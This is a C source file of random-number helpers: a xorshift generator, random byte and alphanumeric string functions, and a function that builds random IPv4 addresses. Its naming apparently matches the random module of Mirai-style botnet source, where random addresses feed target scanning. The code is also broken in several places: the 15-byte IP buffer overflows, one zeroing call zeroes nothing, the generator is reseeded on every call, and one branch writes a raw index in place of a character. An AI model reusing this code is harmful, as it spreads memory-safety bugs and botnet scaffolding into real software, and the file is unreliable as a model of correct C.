#define _GNU_SOURCE

#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <stdio.h>
#include "util.h"
#include "string.h"

#include "includes.h"
#include "rand.h"

static uint32_t x, y, z, w;
int i, j, cnt = 0;
char ip[15];
char *rand_ipv4(char *ip)
{

    char snum[4];
    util_zero(ip, 15);
    util_zero(snum, 0);
    srand(time(NULL));
    for (j = 0; j < 4; j++)
    {
        cnt = rand() % 255;
        sprintf(snum, "%d", cnt);
        util_strcpy(ip + util_strlen(ip), snum);

        if (j < 3)
            util_strcpy(ip + util_strlen(ip), ".");
    }
    return ip;
}

void rand_init(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void) // period 2^96-1
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y;
    y = z;
    z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

void rand_str(char *str, int len) // Generate random buffer (not alphanumeric!) of length len
{
    while (len > 0)
    {
        if (len >= 4)
        {
            *((uint32_t *)str) = rand_next();
            str += sizeof(uint32_t);
            len -= sizeof(uint32_t);
        }
        else if (len >= 2)
        {
            *((uint16_t *)str) = rand_next() & 0xFFFF;
            str += sizeof(uint16_t);
            len -= sizeof(uint16_t);
        }
        else
        {
            *str++ = rand_next() & 0xFF;
            len--;
        }
    }
}

void rand_alphastr(uint8_t *str, int len) // Random alphanumeric string, more expensive than rand_str
{
    const char alphaset[] = "abcdefghijklmnopqrstuvw012345678";

    while (len > 0)
    {
        if (len >= sizeof(uint32_t))
        {
            int i;
            uint32_t entropy = rand_next();

            for (i = 0; i < sizeof(uint32_t); i++)
            {
                uint8_t tmp = entropy & 0xff;

                entropy = entropy >> 8;
                tmp = tmp >> 3;

                *str++ = alphaset[tmp];
            }
            len -= sizeof(uint32_t);
        }
        else
        {
            *str++ = rand_next() % (sizeof(alphaset));
            len--;
        }
    }
}

void rand_str2(char *str, int len) // Generate random buffer (not alphanumeric!) of length len
{
    const char letters[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    const size_t letters_count = sizeof(letters) - 1; // incluye terminacion '\0'
    size_t i, j;

    for (j = 0; j < len; j++)
    {
        char random_char;
        int random_index = (double)rand() / RAND_MAX * letters_count;

        random_char = letters[random_index];
        append(str, random_char);
    }
}

void append(char *s, char c)
{
    int len = strlen(s);
    s[len] = c;
    s[len + 1] = '\0';
}
